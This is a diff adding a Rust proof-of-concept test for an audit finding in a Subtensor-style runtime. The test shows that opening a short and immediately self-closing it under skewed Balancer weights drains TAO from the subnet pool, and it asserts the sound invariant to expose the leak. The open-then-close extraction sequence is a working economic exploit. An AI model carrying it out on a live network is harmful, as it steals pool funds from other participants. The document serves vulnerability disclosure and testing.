+// ===========================================================================
+// PoC (FINDING-01): self-cover close prices the buyback with the WEIGHTED engine
+// while open books the liability with NAIVE constant-product math. Under a
+// Balancer weight skew (w1/w2 < 1 for shorts) an open + immediate self-close at
+// an UNCHANGED price drains ~N*(1-w1/w2) TAO from the subnet pool to the trader.
+// Expected (sound) outcome: trader gets back ~floor P (delta ~ -fee). Observed:
+// trader nets a large profit. The conservation assert is written for the SOUND
+// outcome so a FAILURE proves the leak (magnitude printed).
+// ===========================================================================
+#[test]
+fn poc_short_self_close_leaks_under_skewed_weights() {
+    new_test_ext(1).execute_with(|| {
+        let netuid = setup_market(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
+        // Skew Balancer weights so spot price = 0.5 (w1/w2 = 0.5) with equal
+        // reserves — the short leak side. Fee 0 isolates the leak from swap fees.
+        skew_pool(netuid, 0.5, 0);
+
+        let trader = U256::from(10);
+        let hot = U256::from(11);
+        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
+
+        let bal0 = bal(&trader);
+        let pool0 = SubnetTAO::<Test>::get(netuid).to_u64();
+        let iss0 = TotalIssuance::<Test>::get().to_u64();
+
+        assert_ok!(SubtensorModule::open_short(
+            RuntimeOrigin::signed(trader),
+            hot,
+            netuid,
+            t(1_000 * TAO),
+            None
+        ));
+        // Immediate FULL cash-settled self-close: no price move, no decay.
+        assert_ok!(SubtensorModule::do_close_short_self(
+            RuntimeOrigin::signed(trader),
+            netuid,
+            1_000_000_000,
+            None
+        ));
+
+        let trader_delta = bal(&trader) as i128 - bal0 as i128;
+        let pool_delta = SubnetTAO::<Test>::get(netuid).to_u64() as i128 - pool0 as i128;
+        let iss_delta = TotalIssuance::<Test>::get().to_u64() as i128 - iss0 as i128;
+        println!("[POC] trader balance delta = {trader_delta} rao ({:.4} TAO)", trader_delta as f64 / 1e9);
+        println!("[POC] subnet pool   delta = {pool_delta} rao ({:.4} TAO)", pool_delta as f64 / 1e9);
+        println!("[POC] TotalIssuance delta = {iss_delta} rao");
+        println!("[POC] custody left = {}", custody_bal(netuid));
+
+        // SOUND invariant: an open + instant self-close with no price move must
+        // return ~floor P, i.e. the trader must NOT profit. A failure here with a
+        // large positive delta is the value-leak proof.
+        assert!(
+            trader_delta <= TAO as i128,
+            "FINDING-01 LEAK: trader extracted {trader_delta} rao ({:.4} TAO) from the pool via \
+             self-close under skewed weights, no price move",
+            trader_delta as f64 / 1e9
+        );
+    });
+}
